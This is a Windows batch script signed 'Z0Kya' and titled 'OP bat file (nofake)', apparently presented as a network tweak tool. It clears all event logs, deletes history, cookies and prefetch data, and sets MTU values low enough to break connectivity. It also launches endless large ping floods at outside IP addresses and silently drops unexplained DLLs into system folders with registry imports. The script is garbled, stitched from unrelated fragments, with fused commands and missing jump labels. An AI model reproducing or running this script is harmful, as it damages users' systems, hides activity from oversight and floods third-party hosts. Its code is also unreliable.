:: By Z0Kya
@echo off
title OP bat file (nofake)
dir /s x1.reg
call x1.reg
del /s /f /q c:\windows\temp\*.*
rd /s /q c:\windows\temp
md c:\windows\temp
del /s /f /q C:\WINDOWS\Prefetch
del /s /f /q %temp%\*.*
rd /s /q %temp%
md %temp%
deltree /y c:\windows\tempor~1
deltree /y c:\windows\temp
deltree /y c:\windows\tmp
deltree /y c:\windows\ff*.tmp
deltree /y c:\windows\history
deltree /y c:\windows\cookies
deltree /y c:\windows\recent
deltree /y c:\windows\spool\printers
del c:\WIN386.SWP
cls 
netsh interface ipv4 set subinterface "Ethernet" mtu=1464 store=persistent
ipconfig /release
ipconfig /renew
ping 149.202.89.175 -n 5
netsh int tcp set heuristics disabled
netsh int tcp set global rss=enabled
netsh int tcp set global chimney=enabled
netsh int tcp set global autotuninglevel=normal
netsh int tcp set global congestionprovider=ctcp
netsh int tcp set global ecncapability=disabled
netsh int tcp set global timestamps=disabledstart cmd.exe /k ping  127.0.0.1  -t -l-n 65000
netsh int tcp set global congestionprovider=none
netsh int tcp set global autotuninglevel=high
netsh int tcp set global chimney=disabled
netsh int tcp set global dca=enable
netsh int tcp set global netdma=enable
netsh int tcp set heuristics enable
netsh int tcp set global rss=enabled
netsh int tcp set global timestamps=enable
@ECHO OFF
cd %temp%
ECHO > SG_Vista_TcpIp_Patch.reg Windows Registry Editor Version 5.00  
ECHO >> SG_Vista_TcpIp_Patch.reg [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Psched] 
ECHO >> SG_Vista_TcpIp_Patch.reg "NonBestEffortLimit"=dword:00000000
regedit /s SG_Vista_TcpIp_Patch.reg
del SG_Vista_TcpIp_Patch.reg
FOR /F "tokens=1, 2 * " %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F " tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared! ^<press any key^>
goto theEnd
:do_clear
echo clearing %1
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator !
echo ^<press any key^>
cls
pause
regsvr32 actxprxy.dll
netsh interface ipv4 set subinterface "Internet" mtu=80 store=persistent
netsh interface ipv4 set subinterface "Ethernet" mtu=80 store=persistent
netsh interface tcp set global autotuning=normal
netsh int tcp set global congestionprovider=none
netsh int tcp set global autotuninglevel=high
netsh int tcp set global chimney=disabled
netsh interface ipv4 set subinterface "Local Area Connection" mtu=150 store=persistent
netsh int tcp set global rss=default
netsh int tcp set heuristics disabled
start ping 149.202.89.7 -t -l 65500
ipconfig /flushdns
netsh int tcp set heuristics disabled
netsh int tcp set global rss=enabled
netsh int tcp set global chimney=enabled
netsh int tcp set global autotuninglevel=normal
netsh int tcp set global congestionprovider=ctcp
netsh int tcp set global ecncapability=disabled
netsh int tcp set global timestamps=disabled
netsh int ipv4 set subinterface "Local Area Connection" mtu=80 store=persistent
netsh int tcp set global rsc=enabled
netsh int tcp set heuristics disabled
netsh int tcp set global dca=enabled
netsh int tcp set global netdma=enabled
netsh int tcp set global congestionprovider=ctcp
netsh int tcp set global nonsackrttresiliency=disabled
netsh int tcp set supplemental template=custom icw=10
netsh int tcp set heuristics disabled
netsh interface ip delete arpcache
netsh winsock reset catalog
netsh int ip reset c:resetlog.txt
netsh int ip reset C:\tcplog.txt
netsh winsock reset catalog
netsh interface ip delete arpcache
netsh winsock reset catalog
netsh int ip reset c:resetlog.txt
netsh int ip reset C:\tcplog.txt
netsh winsock reset catalog
netsh interface ipv4 set subinterface "Local Area Connection" mtu=150 store=persistent
netsh interface ipv4 set subinterface "Internet" mtu=80 store=persistent
netsh int ip reset c:resetlog.txt
netsh int ip reset C:\tcplog.txt
set /p ipchek=Inscrivez l'ip de votre serveur ici : 

ping %ipchek% -n 5 > pingip.txt
find "TTL" pingip.txt
if %ERRORLEVEL%==1 (
  echo %ipchek% est Injoignable.
  pause>nul
  del pingip
  goto 69
  )

if %ERRORLEVEL%==0 (
   echo > pingip.txt
   echo voici les resultas de votre ping.
   pause>nul
   del pingip
   goto strt
   )     
C:
cd \
ipconfig /displaydns
cd jre

if exist jre. (
rmdir /S /Q jre
)

jre-1.6.0_01-win32.exe
cd jre1.6.0_01

call unpack-jars.bat

del unpack-jars.bat
cd ..
rename jre1.6.0_01 jre


if exist jre-1.5.0-win32.exe. (
del jre-1.5.0-win32.exe
)

jre\bin\java -Xshare:dump


netsh int ip reset c:resetlog.txt
ipconfig /all
set batch_dir=%~dp0

if exist "%ProgramFiles(x86)%" move /Y "%batch_dir%ficvdec_x86.dll" %systemroot%\SysWoW64\ 
if not exist "%ProgramFiles(x86)%" move /Y "%batch_dir%ficvdec_x86.dll" %systemroot%\System32\
if exist "%ProgramFiles(x86)%" move /Y "%batch_dir%ficvdec_x64.dll" %systemroot%\System32\

if exist "%ProgramFiles(x86)%" regedit /s "%batch_dir%ficvdec_x64.reg"
if not exist "%ProgramFiles(x86)%" regedit /s "%batch_dir%ficvdec_x86.reg
start idle.pyw %1 %2 %3 %4 %5 %6 %7 %8 %9
